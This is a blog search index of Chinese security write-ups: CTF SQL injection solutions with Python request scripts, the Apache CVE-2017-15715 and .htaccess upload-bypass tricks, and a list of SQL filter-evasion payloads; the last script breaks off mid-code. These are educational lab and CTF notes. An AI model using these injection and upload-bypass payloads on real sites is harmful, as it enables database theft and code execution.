<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[实验吧---加了料的报错注入]]></title>
    <url>%2F2019%2F08%2F03%2F%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%8A%A0%E4%BA%86%E6%96%99%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[实验吧 WEB 加了料的报错注入 打开页面是post注入，又是报错注入。所以就用到了burp，后来发现burp不好用，加了消息头也不好用，不知道为啥。既然是post那么就用脚本吧。1.首先正常传参： 12345import requestsurl="http://ctf5.shiyanbar.com/web/baocuo/index.php"r=requests.session()s=r.post(url,data=&#123;'username':"1",'password':"1"&#125;)print(s.text) 2.看看是否能够绕过：(其实这道题比较简单毕竟是直接给你了源码比较好绕过) 12345import requestsurl="http://ctf5.shiyanbar.com/web/baocuo/index.php"r=requests.session()s=r.post(url,data=&#123;'username':"'or '1",'password':"'or '1"&#125;)print(s.text) 查看回显，呦呵有点东西哈。sql语句在这里就不解释了，很简单。然后我又尝试了一个语句：很明显这个语句跟上一个的语句一样，但是结果出现了sql注入检查 12345import requestsurl="http://ctf5.shiyanbar.com/web/baocuo/index.php"r=requests.session()s=r.post(url,data=&#123;'username':"1' and",'password':"'or 1='1"&#125;)print(s.text) ###注入开始既然是加了料的报错，肯定是过滤了而且是报错。再次之前请允许小白在复习一次报错注入。 12345import requestsurl="http://ctf5.shiyanbar.com/web/baocuo/index.php"r=requests.session()s=r.post(url,data=&#123;'username':"1' and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+",'password':"'or '1"&#125;)print(s.text) 被检测到了一看就是被过滤了，加了料的嘛！那我们肯定就需要检查过滤函数，进行模糊测试啥的比如burp，但是burp又不好使。。。。emmmmmmmmmmmmmmmmm。（这里先绕过）对经常使用的报错注入函数updatexml进行测试。在密码中禁止对updatexml的使用，但是用户名并没有禁止。因此通过updatexml在存储非XPath格式的字符串时的报错输出获得所需要的信息。接下来就开始试后台的过滤逻辑，实验中发现：username中不允许使用()，也就是说无法使用函数，那报错注入岂不是没有办法做了？那用password注入呢？因为后台逻辑要查询两个字段，所以password字段在这道题里也可以注入。发现password中不允许使用floor、extractvalue等这些报错函数，也就是说报错注入在password这里也做不了了。也就是说，我们可以username里写报错函数名，password里写剩下的语句，但是这样会有多余的’andpassword=‘那要怎么做呢？记得我们得知的SQL语句格式嘛？ where username=’???’ andpassword=’???’ 而sql语句中可以使用//注释掉中间的SQL语句。也就是说，我们可以使用//来解决这个问题，而且//也没有被吃掉，这叫做HTTP分割注入。**爆出数据库版本： 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select version()))) and &apos;1&quot;&#125;)print(s.text) 爆出数据库名字： 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select database()))) and &apos;1&quot;&#125;)print(s.text) 爆出表名： 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where !table_schema&lt;&gt;&apos;error_based_hpf&apos;))) and &apos;1&quot;&#125;)print(s.text) 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where table_schema regexp &apos;error_based_hpf&apos;))) and &apos;1&quot;&#125;)print(s.text) 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where table_schema regexp &apos;error_based_hpf&apos;))) and &apos;1&quot;&#125;)print(s.text) 12345import requestsurl=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;r=requests.session()s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where table_schema in (十六进制)))) and &apos;1&quot;&#125;)print(s.text) PS：这里关于等号绕过使用了！ &lt;&gt; regexp 十六进制编码。]]></content>
      <tags>
        <tag>报错注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache最新解析漏洞(CVE-2017-15715)绕过文件上传限制]]></title>
    <url>%2F2019%2F08%2F01%2Fapache%E6%9C%80%E6%96%B0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-CVE-2017-15715-%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6%2F</url>
    <content type="text"><![CDATA[apache最新解析漏洞(CVE-2017-15715)绕过文件上传限制 0x01 正则表达式中的’$’ apache这次解析漏洞的根本原因就是这个 $，正则表达式中，我们都知道$用来匹配字符串结尾位置，我们来看看菜鸟教程中对正则表达符$的解释： 1匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。 那么就明白了，在设置了 RegExp 对象的 Multiline 属性的条件下，$还会匹配到字符串结尾的换行符 0x02 Linux环境 这里本地是debian系的kali linux，apache配置文件路径在/etc/apache2/下，apache2.conf是apache核心配置文件，由于我本地php作为apache的mod方式运行的，所以需要在mods-enabled目录下找到关于apache-php模块的配置：(关于apache和php之间的某些关系可以移步我的博客):找到对应的模板和软连接：php7.0.conf -&gt; ../mods-available/php7.0.conf 在这里补充一下软连接的含义吧：在Linux下当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在其它的 目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。例如：ln -s /bin/less /usr/local/bin/less。linux下的软链接类似于windows下的快捷方式。 可以看见php7.0.conf是mods-available/php7.0.conf的软链接，配置如下： 1234567891011121314151617181920212223242526root@kali:/etc/apache2/mods-enabled# cat php7.0.conf&lt;FilesMatch ".+\.ph(p[3457]?|t|tml)$"&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;&lt;FilesMatch ".+\.phps$"&gt; SetHandler application/x-httpd-php-source # Deny access to raw php sources by default # To re-enable it's recommended to enable access to the files # only in specific virtual host or directory Require all denied&lt;/FilesMatch&gt;# Deny access to files without filename (e.g. '.php')&lt;FilesMatch "^\.ph(p[3457]?|t|tml|ps)$"&gt; Require all denied&lt;/FilesMatch&gt;# Running PHP scripts in user directories is disabled by default# # To re-enable PHP in user directories comment the following lines# (from &lt;IfModule ...&gt; to &lt;/IfModule&gt;.) Do NOT set it to On as it# prevents .htaccess files from disabling it.&lt;IfModule mod_userdir.c&gt; &lt;Directory /home/*/public_html&gt; php_admin_flag engine Off &lt;/Directory&gt;&lt;/IfModule&gt; 第一行就告诉了我们apache会将哪些后缀的文件当做php解析：&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;以如下方式结尾的文件会被apache当做php解析： 1234567phpphp3php4php5php7phtphtml 如果我们再结合我们上面提到的关于$的使用，很容易想到，如果后缀名是上面这些后缀名以换行符结尾，那么也是可以解析的，本地构造文件：文件构造好了，从浏览器打开试试看看能不能解析： 补充一下Linux的知识：开启Apache服务在终端输入”vim /etc/apache2/ports.conf” -&gt; 键盘输入i 进入插入编辑模式 -&gt; 修改apache2默认监听端口号为8080 -&gt; 编辑好后，按Esc键+”:wq”保存退出 -&gt; 在终端输入”/etc/init.d/apache2 start” 0x02 Windows环境关于windows环境，p牛博客下面有一些人说测试失败，我也进行了测试，虚拟机环境 win7+phpstudy : Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45配置文件(${Apache_path}/conf/extra/httpd-php.conf)如下： 123456789LoadFile &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/php5ts.dll&quot;LoadModule php5_module &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/php5apache2_4.dll&quot;&lt;IfModule php5_module&gt;PHPIniDir &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/&quot;&lt;/IfModule&gt;LoadFile &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/libssh2.dll&quot;&lt;FilesMatch &quot;\.php$&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 用p牛的代码测试： 12345678910111213141516171819&lt;html&gt;&lt;body&gt; &lt;form action="test.php" method="post" enctype="multipart/form-data"&gt; &lt;input type="file" name="file" /&gt; &lt;input type="text" name="name" /&gt; &lt;input type="submit" value="上传文件" /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpif(isset($_FILES['file'])) &#123; $name = basename($_POST['name']); $ext = pathinfo($name,PATHINFO_EXTENSION); if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) &#123; exit('bad file'); &#125; move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);&#125;?&gt; 抓包修改文件名，上传：可以看见，这里出现了两个warning，其实并非测试不成功，可以看见其实是绕过了我们代码里的黑名单的，已经执行到了move_uploaded_file了，说明程序并没有因为没有绕过黑名单而exit，但是因为涉及到文件读写，而windows操作系统不允许后缀以换行符结尾的文件命名方式，所以这里会文件会创建失败，就出现了这两个warning了。 总结:研究这个漏洞的过程中遇到几个问题：1.获取文件名时不能用$_FILES[‘file’][‘name’]，因为他会自动把换行去掉，这一点有点鸡肋2.默认的Apache配置即可利用，因为默认Apache配置就使用了： 123&lt;FilesMatch \.php$&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 所以理论上，只要用正则来匹配后缀进行php解析的Apache就有这个问题。而这个做法刚好是为了解决Apache老的解析漏洞而做的，可谓非此即彼，必然存在一种解析漏洞。]]></content>
      <tags>
        <tag>解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP和Apache是如何通信的?]]></title>
    <url>%2F2019%2F08%2F01%2FPHP%E5%92%8CApache%E6%98%AF%E5%A6%82%E4%BD%95%E9%80%9A%E4%BF%A1%E7%9A%84%2F</url>
    <content type="text"><![CDATA[apache与php沟通的三种方式 php与apache的主要沟通方式就分为了如下的三种方式cgi模式模块化方式fastcgi模式 cgi模式 cgi定义与说明:我们先来通俗的解释一下什么是cgi,首先cgi是一种规范，汉化的解释为通用的网关接口，其实就是web服务器与php之间的一个翻译机，当web服务器接收到一个请求过来的时候，如果你是用的这种方式，因为浏览器是只能识别html或者其他静态信息的，所以cgi就会给你做出php代码的转换，那么这个程序位于哪里呢？以phpstudy为例 ，位于php的bin目录会看到这个可执行程序。那具体的在apache里应该怎么来配置呢？ 对 PHP 5 用这行： Action application/x-httpd-php “/php/php-cgi.exe” 模块化方式 模块化方式通俗解释：在模块化(DLL)中，PHP是与Web服务器一起启动并运行的，再通俗点说两者是同一个进程的方式在运行，那么具体怎么配置呢？ 对 PHP 5 用这两行： 123 LoadModule php5_module “c:/php/php5apache2.dll” AddType application/x-httpd-php .php 配置 php.ini 的路径 1 PHPIniDir “C:/php” TIP：配置apache以运行php程序 第一步：装载php”模块”,”模块”就是指php的语言包，即我们下载解压后的php文件目录。将此目录改名为”php”复制到amp目录下（和apache目录同级），然后打开apache的配置文件httpd.conf,该文件在amp\Apache\conf目录下。在配置文件中插入如下代码： 1234LoadModule php_module &quot;E:/amp/php/php7apache2_4.dll&quot;&lt;FilesMatch &quot;\.php$\&quot;&gt;setHandler application/x-httpd-php&lt;/FilesMatch&gt; 该配置文件的代码作用是，告知appache，凡是带.php后缀的文件都要找php语言模块处理,”php7apache2_4.dll”文件在amp\php目录下还有另一种配置方式:AddType application/x-httpd-php .php .pap .phtml这些.pap .phtml 是我们自定义的文件后缀，同样也可以用php模块处理 fastcgi 说白点fastcgi也是一种协议，它是一个cgi的管理者，那么它的具体实现到php中就是php的php-fpm模块，但是在apache中是用的专门的fastcgi模块，需要下载.so文件，php-fpm在php5.3以后不再作为第三方的模块而是集成到了php中，它会提前的开启多个cgi程序，管理这些进程，并提供方式合理有效的调度，保证了并发性。]]></content>
      <tags>
        <tag>解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件解析漏洞总结-Apache]]></title>
    <url>%2F2019%2F08%2F01%2F%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-Apache%2F</url>
    <content type="text"><![CDATA[文件解析漏洞总结-Apache 百度许久，又谷歌一番，最终发觉，Apache关于文件解析，似乎只有三种“漏洞”。之所以打引号是因为我觉得这三种“漏洞”都不是Apache的漏洞，只是其特性，而很多程序员不了解这种特性，故而写出有问题的代码，这才给黑客可趁之机，造成漏洞。但大家都称呼这是Apache的文件解析漏洞，我也只好随大流了。1.多后缀名先说第一种特性：多后缀名。这是怎么的一种鲜为人知的特性呢？原来是这样的，Apache认为，一个文件可以有多个后缀，如：werner.txt.png.mp3。这一文件，放在Windows里，毫无疑问，就是个mp3文件，Windows只认最后一个“.”及其后面的字符“mp3”，觉得该文件后缀为“.mp3”，这也是大多数操作系统、应用软件的处理方式、是正常人习惯。而在Apache中，则可能有所不同，如果有必要，Apache会从后（右）往前（左），一一辨别后缀。何时有必要？当Apache不认识某个后缀时，便有必要。如某文件名为：werner.mp3.html.qwe.arex，Apache在处理时，先读取最后一个后缀，为“.arex”，一看，这啥玩意啊，不认识，继续读取下一个后缀“.qwe”，一看，呀，这又是啥，还是不认识，继续读下一个后缀“.html”，一看，哦，这是个超文本标记语言文件，俗称网页文件，这回认识了，也就不继续读下一个后缀了。若是所有后缀都看完了没有一个认识怎么办？此时就会把该文件当做默认类型进行处理了，一般来说，默认类型是text/plain。据说在Apache的配置文件中搜索“DefaultType”就能看到默认类型的明确定义了，但我却不知为何，没有找到。哪些后缀Apache认识，哪些不认识？有一个名为mime.types的文件，其中记录着Apache认识的后缀。在Ubuntu下，该文件位于/etc/mime.types，在Windows下，该文件位于C:/apache/conf/mime.types（类似这样的，注意Apache的安装路径）。该文件是一个一对多的映射表，定义了某一种文件类型，对应的几种后缀。除了该文件，在Apache的配置文件中，还可以用AddCharset语句添加映射，如： 12AddCharset us-ascii .ascii .us-asciiAddCharset ISO-2022-CN .iso2022-cn .cis mime.types是个很长的文件，大概看了下，Apache认识的后缀比我多多了。节选部分如下所示： 123456789101112application/java-archive jarapplication/m3g m3gapplication/java-vm classapplication/javascript jsapplication/json jsontext/html html htm shtmltext/x-diff diff patchvideo/x-flv flvvideo/x-la-asf lsf lsxvideo/x-mng mngvideo/x-ms-asf asf asxvideo/x-ms-wm wm 这一特性会带来什么问题呢？网站往往有上传文件的功能，但一定不想让用户上传程序，因为这很可能会危害网站安全，故而会检查上传文件的后缀名，若是.php，则拒绝上传（假设这是个php站）。此时用户只需上传文件evildoer.php.qwe，若是程序员不了解Apache的这一特性，编写的程序检查后缀时只看“.qwe”，而认为这不是程序文件，允许上传，则用户成功地绕过了上传时的安全检查，上传了php程序文件。该文件的最后一个后缀“.qwe”是Apache不认识的，故而Apache会以倒数第二个后缀“.php”为准，把该文件当做是php文件，解析执行。 这总是奏效的吗？按理来说，由于这是特性而不是漏洞，所以适用于所有版本的Apache。这一奇怪的特性，说不定正是Apache的自豪之处呢。但是，在我的测试中却发现，类似aaa.php.xxx的文件并不会被作为php程序执行，而是被当成文本文件，返回给浏览器，在浏览器中可以看到php源码，而不是执行结果。测试环境是Ubuntu14.04+Apache2.4.7+php5。 这是怎么回事？难道前面几百字都是废话，说的是错的？我们来做个实验。准备一个文件，内容随意，命名为test.jpg.aaa，放置在Apache中，然后在浏览器中访问它，结果如下图所示：可见浏览器是将该文件作为图片处理的。浏览器为何认为test.jpg.aaa是图片呢？aaa可不是图片文件的后缀。这是因为服务器的响应HTTP头中的Content-Type字段值为image/jpeg，浏览器看到image/jpeg，便知这是图片文件。这说明服务器（此处即Apache）是把test.jpg.aaa当做图片的，也说明，前面分析的Apache的多后缀处理是没有错的。 那么aaa.php.xxx为何没有被作为php代码执行呢？我猜是这样的，当然只是我的猜测，实在是找不到相关资料，只好猜了。Apache看到文件aaa.php.xxx，按照多后缀名的解析规则，认为该文件是php程序文件，把该文件作为php程序文件处理。怎么处理呢？交给php解释器，Apache本身并不懂php。而php解释器却有着和Apache不同的后缀解析规则，可能只认最后一个后缀，故而认为aaa.php.xxx不是php程序文件，拒绝执行。在我的测试环境中，php以模块（module）的模式工作于Apache的领导下。这种模式下php接受到领导Apache分配的任务——aaa.php.xxx，一看，不是php程序文件，没法执行，但也没有报错，而是返回了文件内容本身。php还可以以FASTCGI的模式工作于Apache中，此种模式下php遇到类似aaa.php.xxx这种不是php程序的文件，会触发500错误。 php本身是如何识别文件的呢？我在Apache的模块的配置文件中找到了php5.conf，内容如下： 123456789101112131415161718192021222324252627&lt;FilesMatch ".+\.ph(p[345]?|t|tml)$"&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;&lt;FilesMatch ".+\.phps$"&gt; SetHandler application/x-httpd-php-source # Deny access to raw php sources by default # To re-enable it's recommended to enable access to the files # only in specific virtual host or directory Order Deny,Allow Deny from all&lt;/FilesMatch&gt;# Deny access to files without filename (e.g. '.php')&lt;FilesMatch "^\.ph(p[345]?|t|tml|ps)$"&gt; Order Deny,Allow Deny from all&lt;/FilesMatch&gt;# Running PHP scripts in user directories is disabled by default## To re-enable PHP in user directories comment the following lines# (from &lt;IfModule ...&gt; to &lt;/IfModule&gt;.) Do NOT set it to On as it# prevents .htaccess files from disabling it.&lt;IfModule mod_userdir.c&gt; &lt;Directory /home/*/public_html&gt; php_admin_flag engine Off &lt;/Directory&gt;&lt;/IfModule&gt; 阅读上示配置文件可知，被当做php程序执行的文件名要符合正则表达式：”.+.ph(p[345]?|t|tml)”，其中“”符号在正则中匹配结束，故而可知php本身确实是只看最后一个后缀的。就算Apache把某文件当php程序，php自己不认它，也是无用。进一步试验，把php5.conf文件中刚刚提到的正则表达式的“$”换成“.”，即：&quot;.+\.ph(p[345]?|t|tml)\.&quot;,然后重启Apache使配置文件生效，再在浏览器中访问aaa.php.xxx，这次，aaa.php.xxx果然被当做php程序执行了，在浏览器中，看到的是程序执行结果而不是源码。这也从侧面验证了，我的猜测是正确的。测试完之后，一定要记得改回去。2.罕见后缀计算机世界自开天辟地以来，便自由多彩。还记得mime.types文件吗？在该文件中搜索“php”这三个字母，结果如下所示： 1234567werner@Yasser:~$ cat /etc/mime.types | grep php#application/x-httpd-php phtml pht php#application/x-httpd-php-source phps#application/x-httpd-php3 php3#application/x-httpd-php3-preprocessed php3p#application/x-httpd-php4 php4#application/x-httpd-php5 php5 还记得正则表达式”.+.ph(p[345]?|t|tml)$”吗，该正则表达式匹配的不仅仅有php，还有php3、php4、php5、pht和phtml。 好吧，原来不仅php，就连phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀。我原本只知道“.php”的，真是大开眼界。这就好比，不仅py是Python程序文件的后缀，还有pyc和pyo也都是。写上传过滤规则的程序员是否博学多识，也知道这些知识呢？我想，大抵是不知道的。利用这些“罕见”的后缀名，也可能绕过安全检查，干些“坏事”。 我在Ubuntu14.04+Apache2.4.7中进行测试，先准备文件text.php，其内容是经典的Hello World：&lt;?php echo &#39;HELLO WORLD&#39;; ?&gt;然后在浏览器中打开它，成功显示“HELLO WORLD”。再修改该文件后缀为各种后缀，进行测试。测试结果是，以php、phtml、pht、php3、php4和php5为后缀，能成功看到“HELLO WORLD”；以phps为后缀，会报403错误，Forbidden；以php3p为后缀，会在浏览器中看到源码。 3.妙用.htaccess.htaccess是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）。 要想使.htaccess文件生效，需要两个条件，一是在Apache的配置文件中写上：AllowOverride All若这样写则.htaccess不会生效：AllowOverride None二是Apache要加载mod_Rewrite模块。加载该模块，需要在Apache的配置文件中写上：LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so需要注意Apache可能有多个配置文件，后加载的配置文件会覆盖先加载的配置文件中的配置。所以在某个配置文件中将AllowOverride设置成All，若是其后加载的某个配置文件中AllowOverride的设置是None，则也是没有用的。一般来说，先加载httpd.conf，再加载conf.d/中的配置文件，最后加载sites-enabled/中的配置文件。 这意味着，.htaccess并不总是有效的。而且不幸的是，在我的测试环境中.htaccess默认无效。好吧，为了测试，我只好将它改为有效。以下讨论均在.htaccess有效的前提下进行。 .htaccess文件可以配置很多事情，如是否开启站点的图片缓存、自定义错误页面、自定义默认文档、设置WWW域名重定向、设置网页重定向、设置图片防盗链和访问权限控制。但我们这里只关心.htaccess文件的一个作用——MIME类型修改。如在.htaccess文件中写入：AddType application/x-httpd-php xxx就成功地使该.htaccess文件所在目录及其子目录中的后缀为.xxx的文件被Apache当做php文件。另一种写法是： 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 该语句会让Apache把shell.jpg文件解析为php文件。下面是一次测试，测试前已经打开Apache对.htaccess文件的支持。在网站根目录中准备如下文件树： 12345678910│├── htaccess_test/│ ├── .htaccess│ ├── shell.jpg│ ├── type.xxx│ └── test/│ ├── shell.jpg│ └── type.xxx├── shell.jpg└── type.xxx 其中，文件.htaccess的内容为： 12345AddType application/x-httpd-php xxx&lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 文件shell.jpg和type.xxx的内容相同，均为：&lt;?php echo &#39;HELLO WORLD&#39;; ?&gt;然后在浏览器中访问各文件，结果如下表所示：]]></content>
      <tags>
        <tag>解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入中的绕过]]></title>
    <url>%2F2019%2F07%2F30%2Fsql%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[sql注入绕过详解。 一、SQL注入逗号绕过 1.联合查询显注绕过逗号在联合查询时使用 UNION SELECT 1,2,3,4,5,6,7..n 这样的格式爆显示位，语句中包含了多个逗号，如果有WAF拦截了逗号时，我们的联合查询不能用了。绕过在显示位上替换为常见的注入变量或其它语句 12345union select 1,2,3;union select * from ((select 1)A join (select 2)B join (select 3)C）;union select * from ((select 1)A join (select 2)B join (select group_concat(user(),&apos; &apos;,database(),&apos; &apos;,@@datadir))C); 在数据库中演示联合查询UNION开始是我们在URL中注入的语句，这里只是演示，在实际中如果我们在注入语句中有逗号就可能被拦截 1234567mysql&gt; select user_id,user,password from users union select 1,2,3;+---------+-------+----------------------------------+| user_id | user | password |+---------+-------+----------------------------------+| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 || 1 | 2 | 3 |+---------+-------+----------------------------------+2 rows in set (0.04 sec) 不出现逗号，使用Join来注入 12345678mysql&gt; select user_id,user,password from users union select * from ((select 1)A join (select 2)B join (select group_concat(user(),' ',database(),' ',@@datadir))C);;+---------+-------+-------------------------------------------------+| user_id | user | password |+---------+-------+-------------------------------------------------+| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 || 1 | 2 | root@192.168.228.1 dvwa c:\phpStudy\MySQL\data\ |+---------+-------+-------------------------------------------------+2 rows in set (0.08 sec) 2.盲注中逗号绕过MID 和substr 函数用于从文本字段中提取字符 1234567mysql&gt; select mid(user(),1,2);+-----------------+| mid(user(),1,2) |+-----------------+| ro |+-----------------+1 row in set (0.04 sec) 查询数据库用户名第一个字符的ascii码 1234567mysql&gt; select user_id,user,password from users union select ascii(mid(user(),1,2)),2,3;+---------+-------+----------------------------------+| user_id | user | password |+---------+-------+----------------------------------+| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 || 114 | 2 | 3 |+---------+-------+----------------------------------+2 rows in set (0.05 sec) 盲注，通过猜ascii值 12345678910mysql&gt; select user_id,user,password from users where user_id=1 and (select ascii(mid(user(),1,2))=115) ;Empty setmysql&gt; select user_id,user,password from users where user_id=1 and (select ascii(mid(user(),1,2))=114) ;+---------+-------+----------------------------------+| user_id | user | password |+---------+-------+----------------------------------+| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |+---------+-------+----------------------------------+1 row in set (0.04 sec) 逗号绕过SUBTTRING 函数substring(str FROM pos)从字符串str的起始位置pos 返回一个子串 12345678910111213mysql&gt; select substring(&apos;hello&apos; from 1);+---------------------------+| substring(&apos;hello&apos; from 1) |+---------------------------+| hello |+---------------------------+1 row in set (0.04 sec)mysql&gt; select substring(&apos;hello&apos; from 2);+---------------------------+| substring(&apos;hello&apos; from 2) |+---------------------------+| ello |+---------------------------+1 row in set (0.03 sec) 注入 1234567891011mysql&gt; select user_id,user,password from users where user_id=1 and (ascii(substring(user() from 2))=114) ;Empty set//substring(user() from 2)为o(这句话是错误的)//o的ascii为111，mysql&gt; select user_id,user,password from users where user_id=1 and (ascii(substring(user() from 2))=111) ;+---------+-------+----------------------------------+| user_id | user | password |+---------+-------+----------------------------------+| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |+---------+-------+----------------------------------+1 row in set (0.03 sec) PS：这里要注意：substring(user() from 2) 是从第二个字母向后内容，而ascii函数取得首字母的数值。所以这两个函数要联合起来使用3.绕过逗号还可以使用：limit offset： 123select * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0 select * from table limit 2,1;//跳过2条取出1条数据，limit后面是从第2条开始读，读取1条信息，即读取第3条数据 select * from table limit 2 offset 1;//从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条 二、sql注入比较符号（&lt;&gt;）绕过： 同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句：select * from users where id=1 and ascii(substr(database(),0,1))&gt;64此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。那么上面的这条sql语句可以使用greatest变为如下的子句:select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 三、sql注入 or and 绕过： and=&amp;&amp; or=|| 四、sql注入注释符号（#，–）绕过 id=1&#39; union select 1,2,3||&#39;1最后的or ‘1闭合查询语句的最后的单引号，或者：id=1&#39; union select 1,2,&#39;3]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugKu--login3(SKCTF)]]></title>
    <url>%2F2019%2F07%2F30%2FBugKu-login3-SKCTF%2F</url>
    <content type="text"><![CDATA[看到一个登陆框 ，首先用admin+万能密码登陆，发现提示密码错误证明用户名是正确的。 所以我们开始注入：首先我们输入admin’:输入admin ‘#，提示密码错误，输入admin’ #,提示非法字符，一看就是过滤了空格，我们单独输入and、union、select、for、from,发现过滤了and、union、for字符。接着我们就需要绕过过滤字符：括号绕过空格：如果空格被过滤，括号没有被过滤，可以用括号绕过。在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。例如： select(user())from dual where(1=1)and(2=2) 这种过滤方法常常用于time based盲注,例如： ?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23 逗号绕过（使用from或者offset）： 在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决： select substr(database() from 1 for 1);select mid(database() from 1 for 1); 等于号=： 用&lt;&gt;(不等于)绕过。按照以上思路我们使用： ascii(substr(database() from 1 for 1)),但是我们发现for也被过滤了。我们发现mysql用ascii的参数是一个字符串时，会只计算字符串第一位的ascii值。 如图所示，语句ascii(substr(database()from(1)))就可以输出数据库名第一位的ascii值那么思路就很清晰了，根据输入admin’^(ascii(substr(database()from(数字1)))&lt;&gt;数字2)#，根据返回的信息，如果返回了”password error!” ，说明数字2就是数据库的第一位(数字1)的ascii值，为什么这么说呢？admin用户存在，返回1。数字二等于数字一。后面的语句返回0，即1 ^0返回1。说明用户输入栏正确，所以返回password错误。我们写脚本爆出数据库： 123456789101112131415161718192021import requestsurl = 'http://118.89.219.210:49167/index.php'all_string = '''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''database = ''for i in range(1,11): for j in all_string: print('checking '+j) data = &#123; 'username':"admin'^(ascii(substr(database()from(%d)))&lt;&gt;%d)#"%(i,ord(j)), 'password':'1', 'submit':'Log In' &#125; r = requests.post(url,data=data) if 'password error!' in r.text: database = database + j print('the '+str(i)+' place of database is '+j) break if j == 'M' and 'username does not exist!' in r.text: breakprint(database) 本来按这个思路可以继续注表名的，但是发现information被过滤了，无奈，表和列名好像只能靠猜 看别人猜的表名为admin，列名为password，真是玄学… 那就直接爆password：接着们爆出表： 123456789101112131415161718192021import requestsurl = 'http://123.206.31.85:49167/index.php'all_string = 